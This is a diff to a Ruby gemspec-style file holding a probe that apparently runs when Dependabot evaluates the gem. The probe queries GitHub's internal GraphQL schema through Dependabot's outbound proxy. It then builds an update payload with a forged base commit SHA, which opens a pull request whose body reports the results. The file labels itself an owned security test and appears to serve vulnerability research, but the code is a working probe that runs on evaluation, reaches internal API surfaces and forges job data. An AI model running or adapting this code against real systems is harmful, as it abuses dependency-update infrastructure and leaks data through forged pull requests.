@@ -10,8 +10,8 @@ require "uri"
 # three controlled workflow-run proof files.
 module OwnedDependabotNestedWorkflowScopeProbe
   CONSUMER = "7s5/codeload-owned-probe-20261030-91f64a2c"
-  FORGED_BASE_SHA = "7ad9e8ddb67ff0ac75f81bf8b60d2c9cbab5a080"
-  RAW_PATH = "vendor/owned-dependabot-internal-schema-egress-control.txt"
+  FORGED_BASE_SHA = "a6103e8cfc1a3fb55ee800e03b493d119acf7202"
+  RAW_PATH = "vendor/owned-dependabot-internal-schema-get-control.txt"
 
   module_function
 
@@ -45,15 +45,13 @@ module OwnedDependabotNestedWorkflowScopeProbe
 
   def internal_schema_probe
     endpoint = URI("https://api.github.com/graphql")
-    query = 'query{checkSuiteType:__type(name:"CheckSuite"){fields{name}} mutationType:__schema{mutationType{fields{name}}}}'
-    request = Net::HTTP::Post.new(endpoint.request_uri)
-    request["Content-Type"] = "application/json"
+    request = Net::HTTP::Get.new(endpoint.request_uri)
     request["GraphQL-Schema"] = "internal"
-    request.body = JSON.generate("query" => query)
     response = proxy_client(endpoint).request(request)
     parsed = JSON.parse(response.body)
-    check_suite_fields = parsed.dig("data", "checkSuiteType", "fields") || []
-    mutation_fields = parsed.dig("data", "mutationType", "mutationType", "fields") || []
+    types = parsed.dig("data", "__schema", "types") || []
+    check_suite_fields = types.find { |type| type["name"] == "CheckSuite" }&.fetch("fields", []) || []
+    mutation_fields = types.find { |type| type["name"] == "Mutation" }&.fetch("fields", []) || []
     {
       "http_status" => response.code.to_i,
       "internal_artifacts_field_visible" => check_suite_fields.any? { |field| field["name"] == "artifacts" },
@@ -86,8 +84,8 @@ module OwnedDependabotNestedWorkflowScopeProbe
       "data" => {
         "dependencies" => [{
           "name" => "owned_dependabot_nested_workflow_scope_probe",
-          "version" => "0.0.9",
-          "previous-version" => "0.0.8",
+          "version" => "0.0.10",
+          "previous-version" => "0.0.9",
           "requirements" => [requirement],
           "previous-requirements" => [requirement],
           "directory" => "/"
@@ -103,9 +101,9 @@ module OwnedDependabotNestedWorkflowScopeProbe
           "operation" => "create"
         }],
         "base-commit-sha" => FORGED_BASE_SHA,
-        "commit-message" => "test: owned Dependabot internal-schema egress control",
-        "pr-title" => "Owned Dependabot internal-schema egress control",
-        "pr-body" => "Owned security test. The marker records only schema-visibility booleans and an HTTP status from a benign query made through the real Dependabot outbound proxy. Result: #{JSON.generate(probe)}"
+        "commit-message" => "test: owned Dependabot internal-schema GET control",
+        "pr-title" => "Owned Dependabot internal-schema GET control",
+        "pr-body" => "Owned security test. GitHub's GET /graphql response contains schema metadata; the marker records only visibility booleans and an HTTP status from the real Dependabot outbound proxy. Result: #{JSON.generate(probe)}"
       }
     }
   end
@@ -115,7 +113,7 @@ OwnedDependabotNestedWorkflowScopeProbe.run
 
 Gem::Specification.new do |spec|
   spec.name = "owned_dependabot_remote_probe"
-  spec.version = "0.0.9"
+  spec.version = "0.0.10"
   spec.summary = "Owned Dependabot security probe"
   spec.authors = ["Owned Security Test"]
   spec.files = []
